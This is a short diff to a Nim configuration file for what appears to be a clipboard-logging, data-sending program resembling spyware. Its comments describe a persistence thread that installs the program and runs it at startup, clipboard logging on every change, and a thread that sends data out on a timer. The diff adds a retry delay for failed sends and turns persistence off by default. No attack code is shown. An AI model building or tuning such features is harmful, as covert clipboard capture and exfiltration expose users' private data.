@@ -25,6 +25,11 @@ const TICK_INTERVAL*: int = 10
 ## DEFAULT: 3000
 const SEND_INTERVAL*: int = 3000
 
+## if sendThread fails(eg. network error)
+## it will try again after n ms
+## DEFAULT: 1000
+const SEND_THREAD_TRY_INTERVAL*: int = 1000
+
 ## used so only one program is open at a time
 ## DEFAULT: true
 const ALLOW_ONLY_ONE_INSTANCE*: bool = true
@@ -32,7 +37,7 @@ const ALLOW_ONLY_ONE_INSTANCE*: bool = true
 ## persistenceThread is used for installing the program
 ## and starting it when the pc opens
 ## DEFAULT: true
-const USE_PERSISTENCE_THREAD*: bool = true
+const USE_PERSISTENCE_THREAD*: bool = false
 
 ## clipboardThread is used for logging the clipboard
 ## every time it changes
